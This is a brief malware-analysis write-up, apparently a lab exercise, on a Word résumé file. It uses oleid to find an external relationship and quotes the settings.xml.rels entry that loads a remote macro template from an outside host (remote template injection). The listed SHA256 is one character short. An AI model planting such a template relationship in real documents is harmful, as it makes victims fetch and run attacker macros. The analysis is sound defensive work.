# incrediblyPolishedResume.docx

## Identification:

**FileName:** incrediblyPolishedResume.docx

**SHA256:** 868e6f35b12140b2c348cafac261402c1afc0dadbb178d971f1d5f6e5f117ac

**FileSize:** 159744 (bytes)

<br>

## Analysis:

For this analysis of this word file Oletools were used. Initial triage on this sample was carried out using oleid to check for any macro or remote template injections using the command.

`oleid incrediblyPolishedResume.docx`

    oleid 0.60.dev1 - http://decalage.info/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    Filename: incrediblyPolishedResume.docx
    --------------------+--------------------+----------+--------------------------
    Indicator           |Value               |Risk      |Description
    --------------------+--------------------+----------+--------------------------
    File format         |MS Word 2007+       |info      |
                        |Document (.docx)    |          |
    --------------------+--------------------+----------+--------------------------
    Container format    |OpenXML             |info      |Container type
    --------------------+--------------------+----------+--------------------------
    Encrypted           |False               |none      |The file is not encrypted
    --------------------+--------------------+----------+--------------------------
    VBA Macros          |No                  |none      |This file does not contain
                        |                    |          |VBA macros.
    --------------------+--------------------+----------+--------------------------
    XLM Macros          |No                  |none      |This file does not contain
                        |                    |          |Excel 4/XLM macros.
    --------------------+--------------------+----------+--------------------------
    External            |1                   |HIGH      |External relationships
    Relationships       |                    |          |found: attachedTemplate -
                        |                    |          |use oleobj for details
    --------------------+--------------------+----------+--------------------------

Here, from the result of oleid tool, it was found that this word file has external relationships, meaning that it may have remote template injection.

The word file was then extracted and was navigated to \word\_rels\settings.xml.rels. Inside the settings.xml.rels, following contents can be seen as shown below.

    <?xml version="1.0"  ?>
    <Relationships  xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship  Id="rId1"  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"  Target="http://somtaw.warship.kuunlaan.local/macro3.dotm"  TargetMode="External"/>
    </Relationships>

Here, it can be seen in Target value that it will use the remote template 'macro3.dotm' from 'somtaw.warship.kuunlaan.local', which contains the macro and will execute it. 
